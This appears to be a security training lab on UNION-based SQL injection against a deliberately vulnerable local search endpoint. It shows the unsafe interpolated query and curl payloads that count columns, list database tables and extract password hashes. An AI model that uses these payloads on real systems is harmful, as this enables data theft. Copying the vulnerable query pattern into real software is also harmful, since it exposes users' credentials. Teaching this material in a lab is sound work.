# Lab 2: UNION-Based SQL Injection

## Objective
Demonstrate how to leak data from other tables using the `UNION` operator.

## Vulnerable Code
The target endpoint is at `/api/lab/search-vulnerable?q=QUERY`. It uses:
```sql
SELECT username, "publicKey" FROM "User" WHERE username LIKE '%${query}%'
```

## Instructions

1. **Find number of columns**: The `UNION` operator requires the same number of columns as the original query.
```bash
curl "http://localhost:3000/api/lab/search-vulnerable?q=' UNION SELECT NULL,NULL--"
```

2. **Leak Table Names**: Extract information from the PostgreSQL `information_schema`.
```bash
curl "http://localhost:3000/api/lab/search-vulnerable?q=' UNION SELECT table_name, table_schema FROM information_schema.tables--"
```

3. **Leak Sensitive Data**: Extract password hashes from the `User` table.
```bash
curl "http://localhost:3000/api/lab/search-vulnerable?q=' UNION SELECT username, \"passwordHash\" FROM \"User\"--"
```

## Expected Result
## Comparison: Main App Resilience
After seeing the attack succeed here, try the same payload on your main application to see it fail. 
See [Resilience Demonstration](../resilience_demo.md) for instructions.
